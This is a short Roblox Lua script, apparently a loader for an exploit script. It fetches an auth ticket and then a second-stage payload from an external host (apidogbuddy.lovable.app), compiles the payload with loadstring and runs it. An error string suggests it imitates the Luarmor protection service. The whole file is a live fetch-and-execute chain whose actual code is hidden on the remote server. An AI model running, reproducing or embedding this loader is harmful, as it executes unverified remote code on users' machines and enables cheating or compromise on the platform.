local t = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/fa245a27fd9d2dc2?stage=auth")
local s = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/fa245a27fd9d2dc2?stage=src&ticket=" .. game:GetService("HttpService"):UrlEncode(t))
local f, e = loadstring(s)
if not f then error("Larping Luarmor: " .. tostring(e)) end
return f()